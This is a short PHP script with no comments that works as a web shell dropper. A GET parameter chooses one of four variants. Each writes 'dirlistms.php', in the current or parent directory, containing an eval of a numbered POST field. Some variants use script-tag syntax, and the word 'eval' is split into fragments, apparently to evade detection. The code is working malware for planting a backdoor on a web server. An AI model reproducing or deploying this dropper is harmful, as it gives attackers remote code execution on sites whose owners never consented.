<?php
if($_GET["o"]=="1"){
$file = 'dirlistms.php';
$fp=fopen("$file", "w+");
if (is_writable($file) == false) {
        die('can not be write');
}
$data ="<scri";
$data =$data."pt langu";
$data =$data."age=\"php\">@ev";
$data =$data."al(\$_PO";
$data =$data."ST[135009])</scr";
$data =$data."ipt>";
file_put_contents ($file, $data);
echo "success";
}
if($_GET["o"]=="2"){
$file = 'dirlistms.php';
$fp=fopen("$file", "w+");
if (is_writable($file) == false) {
        die('can not be write');
}
$data ="<?php @ev";
$data =$data."al(\$_PO";
$data =$data."ST[135009]);?>";
file_put_contents ($file, $data);
echo "success";
}
if($_GET["o"]=="3"){
$foldbase="../";
$file = $foldbase.'dirlistms.php';
$fp=fopen("$file", "w+");
if (is_writable($file) == false) {
        die('can not be write');
}
$data ="<scri";
$data =$data."pt langu";
$data =$data."age=\"php\">@ev";
$data =$data."al(\$_PO";
$data =$data."ST[135009])</scr";
$data =$data."ipt>";
file_put_contents ($file, $data);
echo "success";
}
if($_GET["o"]=="4"){
$foldbase="../";
$file = $foldbase.'dirlistms.php';
$fp=fopen("$file", "w+");
if (is_writable($file) == false) {
        die('can not be write');
}
$data ="<?php @ev";
$data =$data."al(\$_PO";
$data =$data."ST[135009]);?>";
file_put_contents ($file, $data);
echo "success";
}
?>